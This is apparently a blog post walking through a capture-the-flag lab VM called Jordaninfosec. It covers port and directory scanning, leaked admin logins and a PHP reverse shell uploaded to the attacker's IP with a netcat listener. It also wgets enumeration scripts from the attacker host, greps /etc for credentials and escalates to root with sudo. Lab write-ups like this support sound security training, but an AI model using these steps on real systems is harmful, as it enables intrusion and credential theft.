---
layout: post
title: CTF Jordaninfosec
date:   2022-02-17:15:11 -0600
categories: CTF
tags: Linux
---

# netdiscovery
![](https://i.imgur.com/0Tczin5.png)
192.168.0.30

# nmap
```sh
nmap -sV -p- 192.168.0.30
```

![](https://i.imgur.com/948W0Tv.png)

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# gobuster


```sh
gobuster dir -t 100 -u http://192.168.0.30/ -w Documents/wordlist/directory-list-medium.txt
```

![](https://i.imgur.com/XAJINyC.png)

# First flag
http://192.168.0.30/flag/
The 1st flag is : {8734509128730458630012095}


# gobuster on uploaded_files
gobuster dir -t 100 -u http://192.168.0.30/uploaded_files -w Documents/wordlist/directory-list-medium.txt


# robots.txt
http://192.168.0.30/robots.txt

User-agent: *
Disallow: /
Disallow: /backup
Disallow: /admin
Disallow: /admin_area
Disallow: /r00t
Disallow: /uploads
Disallow: /uploaded_files
Disallow: /flag

# flag
192.168.0.30/admin_area/
https://i.imgur.com/nJdZs9h.png
	username : admin
	password : 3v1l_H@ck3r
	The 2nd flag is : {7412574125871236547895214}
It's not realist... and too easy.

# Connect as admin to the web page
http://192.168.0.30/index.php

## Upload php revers shell 
https://github.com/pentestmonkey/php-reverse-shell
I upload my revershell.
 49 $ip = '192.168.0.21';  // CHANGE THIS
 50 $port = 4648;       // CHANGE THIS
 

## nc
nc -nlvp 4648

## open the file
http://192.168.0.30/uploaded_files/php-reverse-shell.php

## I have a shell
https://i.imgur.com/e71ZKtm.png

# Enum

## open http server
in my script directory
```sh
python2.7 -m SimpleHTTPServer
```

## Download them
```sh
wget http://192.168.0.21:8000/lin.py
wget http://192.168.0.21:8000/lse.sh
wget http://192.168.0.21:8000/pol.py
```

## lse.sh
https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
```sh
sh lse.sh
```


[*] sys050 Can root user log in via SSH?................................... yes!

# /var/www/html/hint.txt
try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)

The 3rd flag is : {7645110034526579012345670}

# Find the hidden file
```sh
find / -name ".*" 2> /dev/null
```
/home/technawi/.sudo_as_admin_successful
So I can use sudo with the user technawi

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#files-containing-passwords
```sh
grep --color=auto -rnw '/etc' -ie "technawi" --color=always 2> /dev/null

/etc/subgid:3:technawi:165536:65536
/etc/mysql/conf.d/credentials.txt:3:username : technawi
/etc/subuid:3:technawi:165536:65536
/etc/passwd:30:technawi:x:1000:1000:technawi,,,:/home/technawi:/bin/bash
/etc/group:5:adm:x:4:syslog,technawi
/etc/group:18:cdrom:x:24:technawi
/etc/group:21:sudo:x:27:technawi
/etc/group:23:dip:x:30:technawi
/etc/group:35:plugdev:x:46:technawi
/etc/group:49:lxd:x:110:technawi
/etc/group:54:technawi:x:1000:
/etc/group:55:lpadmin:x:115:technawi
/etc/group:56:sambashare:x:116:technawi
```

hehe
```ssh
cat /etc/mysql/conf.d/credentials.txt

The 4th flag is : {7845658974123568974185412}

username : technawi
password : 3vilH@ksor
```

# ssh
```sh
ssh technawi@192.168.0.30
3vilH@ksor
```
# sudo

```sh
sudo -l

[sudo] password for technawi: 
Matching Defaults entries for technawi on Jordaninfosec-CTF01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User technawi may run the following commands on Jordaninfosec-CTF01:
    (ALL : ALL) ALL
```
Ok
```sh
sudo su
root@Jordaninfosec-CTF01:/home/technawi# id
uid=0(root) gid=0(root) groups=0(root)
root@Jordaninfosec-CTF01:/home/technawi# whoami
root

root@Jordaninfosec-CTF01:/home/technawi# cd /var/www/html
root@Jordaninfosec-CTF01:/var/www/html# cat flag.txt

The 5th flag is : {5473215946785213456975249}

Good job :)

You find 5 flags and got their points and finish the first scenario....

```
It was too easy.
